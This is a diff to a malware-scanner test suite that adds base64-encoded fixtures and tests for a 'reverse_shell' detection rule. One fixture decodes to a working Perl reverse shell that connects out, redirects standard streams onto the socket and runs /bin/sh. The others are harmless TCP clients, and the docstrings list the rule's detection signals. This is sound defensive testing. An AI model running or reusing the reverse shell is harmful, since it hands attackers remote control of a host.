@@ -107,6 +107,50 @@ def _multiline_python_socket_reverse_shell_fixture() -> str:
     ).decode()
 
 
+def _benign_python_socket_client_fixture() -> str:
+    """An ordinary multiline Python TCP client — connects, exchanges data, closes.
+
+    No descriptor redirection (``os.dup2``) or shell execution follows the
+    ``connect()`` call, so this must NOT match ``reverse_shell``/``$python_socket``
+    even though it shares the same ``socket.socket(...)`` / ``.connect(...)``
+    shape as `_multiline_python_socket_reverse_shell_fixture`.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
+        "LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQpKQpzLnNlbmQoYiJHR"
+        "VQgLyBIVFRQLzEuMFxyXG5cclxuIikKZGF0YSA9IHMucmVjdig0MDk2KQpwcmludChkYXRhK"
+        "QpzLmNsb3NlKCkK"
+    ).decode()
+
+
+def _multiline_perl_socket_reverse_shell_fixture() -> str:
+    """A Perl reverse shell: connect, redirect STDIN/STDOUT/STDERR onto the
+    socket, then exec a shell. Mirrors the descriptor-redirection + exec shape
+    `$perl_socket` must now require, matching the Python fixture's convention.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmlmIChjb25uZWN0KFNPQ0tFVCwgc29ja2FkZHJfaW4oJHBv"
+        "cnQsIGluZXRfYXRvbigkaXApKSkpIHsKICAgIG9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwog"
+        "ICAgb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOwogICAgb3BlbihTVERFUlIsICI+JlNPQ0tF"
+        "VCIpOwogICAgZXhlYygiL2Jpbi9zaCAtaSIpOwp9Cg=="
+    ).decode()
+
+
+def _benign_perl_socket_client_fixture() -> str:
+    """An ordinary Perl TCP client — connects, exchanges a line, closes.
+
+    No descriptor redirection or ``exec`` follows the ``connect()`` call, so
+    this must NOT match ``reverse_shell``/``$perl_socket``.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKcHJpbnQgU09DS0VUICJoZWxsb1xuIjsKbXkgJGxpbmUgPSA8"
+        "U09DS0VUPjsKY2xvc2UoU09DS0VUKTsK"
+    ).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -626,6 +670,50 @@ class TestBuiltInMalwarePackaging:
         )
         assert _has_rule(findings, "reverse_shell")
         assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_does_not_match_benign_python_socket_client(self):
+        """An ordinary multiline TCP client must not fire ``reverse_shell``.
+
+        `$python_socket` requires ``socket.socket(...)``/``.connect(...)`` to
+        share a physical file, but stopping there also matches any plain
+        client that connects and exchanges data — see
+        `_benign_python_socket_client_fixture`. The string must additionally
+        require descriptor-redirection/shell evidence (``os.dup2``,
+        ``subprocess``, ``os.system``, ``pty.spawn``, ``execve``) after the
+        ``connect()`` call.
+        """
+        findings = _run_builtin(
+            _benign_python_socket_client_fixture(),
+            "scripts/client.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_matches_multiline_perl_socket(self):
+        """`$perl_socket` must fire on a real multiline Perl reverse shell.
+
+        See `_multiline_perl_socket_reverse_shell_fixture`: connect, then
+        redirect STDIN/STDOUT/STDERR onto the socket and exec a shell.
+        """
+        findings = _run_builtin(
+            _multiline_perl_socket_reverse_shell_fixture(),
+            "scripts/backdoor.pl",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_does_not_match_benign_perl_socket_client(self):
+        """An ordinary Perl TCP client must not fire ``reverse_shell``.
+
+        Before this fix, `$perl_socket` required only ``use Socket;`` plus a
+        ``socket(SOCK...`` call — it did not even require ``connect()`` — so
+        it matched any script that merely used the ``Socket`` module. See
+        `_benign_perl_socket_client_fixture`.
+        """
+        findings = _run_builtin(
+            _benign_perl_socket_client_fixture(),
+            "scripts/client.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
 
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
